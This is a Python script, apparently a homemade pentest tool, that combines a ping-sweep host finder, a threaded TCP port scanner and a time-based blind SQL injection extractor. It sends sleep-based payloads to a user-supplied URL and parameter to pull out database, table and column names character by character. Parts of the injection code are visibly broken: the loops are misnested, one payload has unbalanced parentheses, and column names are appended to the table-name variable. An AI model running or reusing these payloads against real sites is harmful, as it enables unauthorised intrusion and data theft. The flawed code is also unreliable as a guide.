import os
import socket
from datetime import datetime
from multiprocessing.pool import ThreadPool
import requests
import sys
class ScanPort:
    def __init__(self):
        self.ip = None
        self.start_port=None
        self.finish_port=None
        self.ports_service=dict()


    def scan_port(self, port):


        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            res = s.connect_ex((self.ip, port))
            if res == 0:  # 端口开启
                print('Ip:{} Port:{}  open '.format(self.ip, port))#打印开启端口
        except Exception as e:
            print(e)
        finally:
            s.close()

    def start(self,start_port,finish_port):
        self.start_port=start_port
        self.finish_port=finish_port


        new_ip = input("please in put your ip")
        self.ip = socket.gethostbyname(new_ip)
        ports = [i for i in range(start_port,finish_port)]

        socket.setdefaulttimeout(0.5)
        # 开始时间
        t1 = datetime.now()
        # 设置多进程
        threads = []
        pool = ThreadPool(processes=8)
        pool.map(self.scan_port, ports)
        pool.close()
        pool.join()

        print('端口扫描已完成，耗时：', datetime.now() - t1)
class find_host: #发现内网中的主机

    def ping_ip(self,ip_str):
        cmd = ["ping", "-n 1", "-v 1", ip_str]
        resopnse = os.popen(" ".join(cmd)).readlines()
        ip_list = []
        flag = False
        for line in list(resopnse):
            if not line:
                continue
            if str(line).upper().find("TTL") >= 0:
                flag = True
                break
        if flag:
            print(ip_str+' alive')
            #ip_list.append(str(ip_str))
    def start_find(self):
        ip=input("please input your ip :")
        ip=ip.split('.')
        ip.pop()

        for i in range(1,255):
            new_ip=ip[0]+'.'+ip[1]+'.'+ip[2]+'.'+str(i)


            self.ping_ip(new_ip)

def muem():#菜单函数

        print('''
            -----选择功能-----
            1.主机扫描
            2.端口扫描
            3.sql爆破
            -----选择功能-----
            ''')



def bool_database_name():#基于布尔类型的时间盲注
    database_name =''
    table_name=''
    cloumn_name=''

    url=input("please input your website:")
    ob=input("input the param:")#输入参数

    for j in range(1, 50):  #这个数值可以写大一点
        for i in '0123456789abcdefghijklmnopqrstuvwxyz,_@!$%^&*(）+—ABCDEFGHIJKLMNOPQRSTUVWXYZ':
            # 根据网站响应速度选择时间
            payload = f"?{ob}=1' and sleep(if(substr(database(),%d,1)='%s',2,0)) --+" % (j, i)#如果第j个字符=i,则sleep2秒
            # 爆表
            #payload=f"?{ob}=1' and sleep(if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s',2,0)) --+" % (j,i)
            # 暴列
            #payload = f"?{ob}=1' and sleep(if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),%d,1)='%s',2,0)) --+" % (j, i)
            time1 = datetime.now()
            r = requests.get(url + payload)
            time2 = datetime.now()
            sec = (time2 - time1).seconds
            if sec >= 2:
                database_name += i
                print(database_name)
                break
        table_name=input("请输入需要爆破的数据库名称：")
        for j in range(1, 50):  # 这个数值可以写大一点
            for i in '0123456789abcdefghijklmnopqrstuvwxyz,_@!$%^&*(）+—ABCDEFGHIJKLMNOPQRSTUVWXYZ':

                payload=f"?{ob}=1' and sleep(if(substr((select group_concat(table_name) from information_schema.tables where table_schema={table_name})),%d,1)='%s',2,0)) --+" % (j,i)
                # 暴列
                # payload = f"?{ob}=1' and sleep(if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),%d,1)='%s',2,0)) --+" % (j, i)
                time1 = datetime.now()
                r = requests.get(url + payload)
                time2 = datetime.now()
                sec = (time2 - time1).seconds
                if sec >= 2:
                    table_name += i
                    print("tables:"+table_name)
                    break
        t_name=input("请输入要爆破表的名称")
        for j in range(1, 50):  # 这个数值可以写大一点
            for i in '0123456789abcdefghijklmnopqrstuvwxyz,_@!$%^&*(）+—ABCDEFGHIJKLMNOPQRSTUVWXYZ':
                # 暴列
                payload = f"?{ob}=1' and sleep(if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name={t_name}),%d,1)='%s',2,0)) --+" % (j, i)
                time1 = datetime.now()
                r = requests.get(url + payload)
                time2 = datetime.now()
                sec = (time2 - time1).seconds
                if sec >= 2:
                    table_name += i
                    print("cloumns:"+table_name)
                    break

if __name__ == '__main__':
    muem()
    choice = input('please enter your choice\n')
    if choice == '1':
        find_host = find_host()
        find_host.start_find()
    if choice == '2':
        scan_port = ScanPort()
        scan_port.start(1,1520)
    if choice=='3':
        bool_database_name()








    # scan_port=ScanPort()
    # scan_port.ip='192.168.1.1'
    # scan_port.start(1,1520)
